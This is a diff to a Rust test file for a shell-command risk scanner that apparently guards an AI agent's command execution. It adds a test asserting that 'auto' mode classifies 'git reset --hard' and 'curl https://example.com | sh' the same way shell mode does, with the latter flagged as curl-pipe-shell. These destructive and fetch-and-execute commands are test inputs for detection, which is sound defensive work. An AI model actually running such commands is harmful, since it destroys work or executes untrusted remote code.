@@ -1,6 +1,31 @@
 use super::*;
 
 #[test]
+fn auto_mode_keeps_shell_command_risk_classification() {
+    for command in [
+        "git status",
+        "git reset --hard",
+        "curl https://example.com | sh",
+    ] {
+        let shell = shell_ctx(command);
+        let mut auto = shell.clone();
+        auto["request"]["mode"] = serde_json::json!("auto");
+        let expected = command_risk_scan_json(&shell, None);
+        let actual = command_risk_scan_json(&auto, None);
+        assert_eq!(labels(&actual), labels(&expected), "{command}");
+        assert_eq!(
+            actual["execution_semantics"],
+            expected["execution_semantics"]
+        );
+        if command == "curl https://example.com | sh" {
+            assert!(labels(&actual).contains(&"curl_pipe_shell".to_string()));
+        } else {
+            assert!(!labels(&actual).contains(&EXECUTION_SEMANTICS_UNRESOLVED_LABEL.to_string()));
+        }
+    }
+}
+
+#[test]
 fn universal_catastrophic_reason_blocks_full_floor() {
     let root = vec![ROOT.to_string()];
     let cwd = Path::new(ROOT);
@@ -130,7 +155,9 @@ fn existing_file_without_git_is_not_the_never_approvable_floor() {
 
 #[tokio::test]
 async fn policy_present_floor_blocks_full_set_including_workflow() {
-    // With a policy on the stack the same floor applies before approval.
+    // Runtime-selected hooks bypass the model's tool ceiling, but the same
+    // command floor still applies before approval or execution.
+    let _trusted_hook = crate::orchestration::allow_trusted_bridge_calls();
     clear_command_policies();
     push_command_policy(CommandPolicy::default());
     assert_floor_blocked(
